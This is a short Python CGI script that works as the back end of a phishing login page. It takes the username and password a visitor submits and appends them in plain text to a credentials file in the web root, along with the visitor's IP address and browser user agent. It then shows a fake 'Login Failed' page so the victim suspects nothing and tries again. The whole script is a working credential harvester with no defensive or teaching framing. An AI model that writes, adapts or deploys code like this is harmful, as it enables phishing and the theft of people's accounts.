#!/usr/bin/env python3
import cgi, datetime, os

# Get form input
form = cgi.FieldStorage()
user = form.getvalue("user")
pw = form.getvalue("pass")

# Metadata
ip = os.environ.get("REMOTE_ADDR", "unknown")
ua = os.environ.get("HTTP_USER_AGENT", "unknown")
time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# Save attempt
try:
    with open("/var/www/html/credentials.txt", "a") as f:
        f.write(f"[{time}] IP: {ip} | Username: {user} | Password: {pw} | User-Agent: {ua}\n")
except Exception as e:
    # If writing fails, just continue so Apache doesn't throw 500 error
    pass

# Return fake login failed page
print("Content-type: text/html\n")
print("""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login Failed</title>
  <style>
    body { font-family: Arial, sans-serif; background-color: #f5f6fa;
           display: flex; justify-content: center; align-items: center;
           height: 100vh; margin: 0; }
    .box { background: #fff; padding: 30px; border-radius: 10px;
           box-shadow: 0px 4px 12px rgba(0,0,0,0.1);
           text-align: center; width: 350px; }
    h2 { color: #d9534f; }
    a { text-decoration: none; color: #4CAF50; }
  </style>
</head>
<body>
  <div class='box'>
    <h2>Login Failed</h2>
    <p>Invalid username or password. Please try again.</p>
    <a href='/index.html'>Return to Login</a>
  </div>
</body>
</html>
""")
